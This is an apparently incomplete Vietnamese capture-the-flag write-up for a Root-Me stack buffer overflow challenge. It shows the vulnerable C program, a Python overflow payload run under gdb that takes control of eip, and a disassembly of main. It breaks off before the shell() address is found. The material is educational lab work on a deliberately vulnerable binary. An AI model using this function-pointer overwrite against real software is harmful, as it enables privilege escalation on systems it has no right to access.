# Co-che-hoat-dong-cua-ma-doc - challenge 2 CTF Write up
```html
ELF x86 - Stack buffer overflow basic 2 : ssh -p 2222 app-systeme-ch15@challenge02.root-me.org
```
![image](https://user-images.githubusercontent.com/64201705/119267758-20c6c080-bc1a-11eb-9679-4ad8a2aba493.png)

## Write up

```Text
Sau khi SSH vào server thì ta dùng lệnh cat để in code trong file source code ra
```
Ta sẽ được như này:
![image](https://user-images.githubusercontent.com/64201705/119267830-6d120080-bc1a-11eb-90fd-9801660bea49.png)

```C
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

void shell() {
    setreuid(geteuid(), geteuid());
    system("/bin/bash");
}

void sup() {
    printf("Hey dude ! Waaaaazzaaaaaaaa ?!\n");
}

void main()
{
    int var;
    void (*func)()=sup;
    char buf[128];
    fgets(buf,133,stdin);
    func();
}
```
Rõ ràng ta thấy để vào được shell bằng câu lệnh:
```C 
system("/bin/bash"); 
``` 
thì ta cần chương trình gọi hàm shell(), đọc source code ta thấy sau khi nhận 128 bytes từ input stdin bỏ vào biến buf thì chương trình gọi hàm func().
Ở đây ta sẽ nghĩ tới việc thay thế địa chỉ gọi hàm func() bằng hàm shell(). 
Trước hết ta sẽ thử ghi đè 128 bytes và 4 bytes phía sau bằng chữ LDLD xem kết quả sẽ như thế nào trong thanh ghi bằng cách sử dụng gdb.
![image](https://user-images.githubusercontent.com/64201705/119268127-bc0c6580-bc1b-11eb-8125-815eb5c10781.png)
```Bash  
(gdb) run < <(python -c "print 'A'*128+'LDLD'")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /challenge/app-systeme/ch15/ch15 < <(python -c "print 'A'*128+'LDLD'")

Program received signal SIGSEGV, Segmentation fault.
0x444c444c in ?? ()
(gdb) info register
eax            0x444c444c       1145848908
ecx            0xbffffa7c       -1073743236
edx            0xb7fc489c       -1208203108
ebx            0x804a000        134520832
esp            0xbffffa6c       0xbffffa6c
ebp            0xbffffb08       0xbffffb08
esi            0xb7fc3000       -1208209408
edi            0x0      0
eip            0x444c444c       0x444c444c
eflags         0x10282  [ SF IF RF ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
(gdb)
``` 
ta thấy chương trình sẽ bị crash và giá trị tại eax sẽ là chữ LDLD dưới dạng hex: 0x444c444c
Ta thử disassemble main thử xem:
![image](https://user-images.githubusercontent.com/64201705/119268351-bc593080-bc1c-11eb-9547-566b9c40f7a3.png)
```Bash
Dump of assembler code for function main:
   0x08048584 <+0>:     lea    0x4(%esp),%ecx
   0x08048588 <+4>:     and    $0xfffffff0,%esp
   0x0804858b <+7>:     pushl  -0x4(%ecx)
   0x0804858e <+10>:    push   %ebp
   0x0804858f <+11>:    mov    %esp,%ebp
   0x08048591 <+13>:    push   %ebx
   0x08048592 <+14>:    push   %ecx
   0x08048593 <+15>:    sub    $0x90,%esp
   0x08048599 <+21>:    call   0x80485de <__x86.get_pc_thunk.ax>
   0x0804859e <+26>:    add    $0x1a62,%eax
   0x080485a3 <+31>:    lea    -0x1aa7(%eax),%edx
   0x080485a9 <+37>:    mov    %edx,-0xc(%ebp)
   0x080485ac <+40>:    mov    -0x4(%eax),%edx
   0x080485b2 <+46>:    mov    (%edx),%edx
   0x080485b4 <+48>:    sub    $0x4,%esp
   0x080485b7 <+51>:    push   %edx
   0x080485b8 <+52>:    push   $0x85
   0x080485bd <+57>:    lea    -0x8c(%ebp),%edx
   0x080485c3 <+63>:    push   %edx
   0x080485c4 <+64>:    mov    %eax,%ebx
   0x080485c6 <+66>:    call   0x8048390 <fgets@plt>
   0x080485cb <+71>:    add    $0x10,%esp
   0x080485ce <+74>:    mov    -0xc(%ebp),%eax
   0x080485d1 <+77>:    call   *%eax
   0x080485d3 <+79>:    nop
   0x080485d4 <+80>:    lea    -0x8(%ebp),%esp
   0x080485d7 <+83>:    pop    %ecx
   0x080485d8 <+84>:    pop    %ebx
---Type <return> to continue, or q <return> to quit---
   0x080485d9 <+85>:    pop    %ebp
   0x080485da <+86>:    lea    -0x4(%ecx),%esp
   0x080485dd <+89>:    ret
End of assembler dump.
```
Ta thấy sau khi gọi hàm fgets tại địa chỉ 0x080485c6 thì nó tiếp tục gọi hàm func() là con trỏ hàm được lưu trong thanh ghi eax, do đó ta sẽ tìm địa chỉ hàm shell để thay thế vào thanh ghi này bằng cách disass shell

![image](https://user-images.githubusercontent.com/64201705/119268337-ae0b1480-bc1c-11eb-8892-cec5781bc9ad.png)

